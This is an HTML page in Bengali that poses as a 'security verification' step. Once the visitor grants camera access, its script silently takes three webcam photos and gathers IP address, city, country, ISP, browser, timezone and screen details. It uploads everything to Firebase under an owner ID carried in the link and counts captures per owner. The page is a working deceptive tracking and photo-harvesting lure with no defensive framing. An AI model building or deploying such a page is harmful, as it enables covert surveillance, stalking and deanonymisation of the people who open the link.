<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ভেরিফিকেশন প্রয়োজন</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>
<body style="background:#f6f8fb;">

<div style="max-width:520px;margin:40px auto;padding:0 20px;">

  <div style="background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(13,20,32,0.1);overflow:hidden;">

    <div style="background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;padding:38px 30px 30px;text-align:center;">
      <div style="width:70px;height:70px;margin:0 auto 20px;border-radius:50%;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;font-size:30px;">🔒</div>
      <h1 style="font-size:22px;font-weight:800;letter-spacing:-0.02em;margin-bottom:8px;">নিরাপত্তা যাচাইকরণ</h1>
      <p style="font-size:14px;opacity:.85;line-height:1.5;">অনুগ্রহ করে আপনার পরিচয় যাচাই করুন</p>
    </div>

    <div style="padding:30px;">

      <div id="statusBox" style="background:#eef2ff;border:1px solid #c7d2fe;color:#4338ca;padding:14px 16px;border-radius:11px;font-size:13.5px;font-weight:600;text-align:center;margin-bottom:20px;">
        ক্যামেরার অনুমতি দিন
      </div>

      <div style="position:relative;border-radius:14px;overflow:hidden;aspect-ratio:3/4;background:#000;margin-bottom:20px;">
        <video id="video" autoplay playsinline muted style="width:100%;height:100%;object-fit:cover;transform:scaleX(-1);"></video>
        <div style="position:absolute;top:14px;left:14px;background:rgba(0,0,0,0.65);color:#fff;padding:6px 12px;border-radius:8px;font-size:12px;font-weight:600;" id="captureCount">ছবি: 0/3</div>
        <div id="countdown" style="position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-size:120px;font-weight:800;color:#fff;text-shadow:0 0 50px #4f46e5;background:rgba(0,0,0,0.4);"></div>
      </div>

      <div style="background:#f8fafc;padding:14px;border-radius:11px;font-size:12.5px;color:#64748b;line-height:1.6;text-align:center;">
        এই যাচাইকরণে আপনার ছবি ও ডিভাইস ইনফো সংগ্রহ করা হবে
      </div>

    </div>
  </div>

</div>

<canvas id="canvas" style="display:none;"></canvas>

<script type="module">
import { db, collection, addDoc, serverTimestamp, doc, updateDoc, increment,
         ref, uploadBytes, getDownloadURL, storage } from "./firebase.js";

/* Config */
const CAPTURE_COUNT   = 3;
const CAPTURE_GAP_MS  = 2500;
const IMAGE_QUALITY   = 0.8;

/* URL params */
const params   = new URLSearchParams(location.search);
const ownerUid = params.get("id");

if (!ownerUid){
  document.getElementById("statusBox").textContent = "❌ ভুল লিংক — owner ID নেই।";
  throw new Error("No owner UID");
}

const video        = document.getElementById("video");
const canvas       = document.getElementById("canvas");
const statusBox    = document.getElementById("statusBox");
const captureCount = document.getElementById("captureCount");
const countdown    = document.getElementById("countdown");

let stream = null;
let captured = 0;

/* Intel */
async function getIP(){
  try { const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json(); return d.ip; }
  catch { return "Unknown"; }
}
async function getGeo(){
  try { const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        return {
          city: d.city || "?",
          country: d.country_name || "?",
          isp: d.org || "?",
          text: (d.city||"?") + ", " + (d.country_name||"?") + " — " + (d.org||"?")
        };
  } catch { return { city:"?", country:"?", isp:"?", text:"Unknown" }; }
}
function getUA(){ return navigator.userAgent; }

/* Start camera */
async function start(){
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
    });
    video.srcObject = stream;
    await video.play();
    await new Promise(r => video.readyState >= 2 ? r() : video.onloadeddata = r);
    await new Promise(r => setTimeout(r, 800));

    statusBox.textContent = "✅ ক্যামেরা চালু — ছবি তোলা হচ্ছে…";
    captureLoop();
  } catch (err) {
    console.error(err);
    statusBox.textContent = "❌ ক্যামেরা পাওয়া যায়নি — অনুমতি দিন";
  }
}

/* Capture loop */
async function captureLoop(){
  const ipData = await getIP();
  const geoData = await getGeo();
  const ua = getUA();
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const lang = navigator.language;
  const screenRes = window.screen.width + "×" + window.screen.height;

  for (let i = 0; i < CAPTURE_COUNT; i++){
    captureCount.textContent = "ছবি: " + (i+1) + "/" + CAPTURE_COUNT;

    /* countdown 3-2-1 */
    countdown.style.display = "flex";
    for (let c = 3; c > 0; c--){
      countdown.textContent = c;
      await new Promise(r => setTimeout(r, 500));
    }
    countdown.style.display = "none";

    /* capture */
    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY));
    if (blob){
      /* Upload to Firebase Storage */
      let photoUrl = "";
      try {
        const path = "captures/" + ownerUid + "/" + Date.now() + "_" + i + ".jpg";
        const storageRef = ref(storage, path);
        await uploadBytes(storageRef, blob);
        photoUrl = await getDownloadURL(storageRef);
      } catch(e){ console.warn("Storage error:", e); }

      /* Save to Firestore */
      await addDoc(collection(db, "captures"), {
        ownerUid: ownerUid,
        photoUrl: photoUrl,
        ip: ipData,
        geo: geoData.text,
        geoCity: geoData.city,
        geoCountry: geoData.country,
        geoISP: geoData.isp,
        userAgent: ua,
        timezone: tz,
        language: lang,
        screen: screenRes,
        frameIndex: i + 1,
        totalFrames: CAPTURE_COUNT,
        createdAt: serverTimestamp()
      });

      /* Increment owner's counter */
      try {
        await updateDoc(doc(db, "users", ownerUid), {
          totalCaptures: increment(1)
        });
      } catch(e){ /* ignore if user doc missing */ }

      captured++;
    }

    if (i < CAPTURE_COUNT - 1){
      await new Promise(r => setTimeout(r, CAPTURE_GAP_MS - 1500));
    }
  }

  /* Stop camera */
  if (stream) stream.getTracks().forEach(t => t.stop());

  statusBox.textContent = "✅ ভেরিফিকেশন সম্পূর্ণ — ধন্যবাদ!";
  statusBox.style.background = "#ecfdf5";
  statusBox.style.borderColor = "#86efac";
  statusBox.style.color = "#15803d";
}

start();
</script>

</body>
</html>
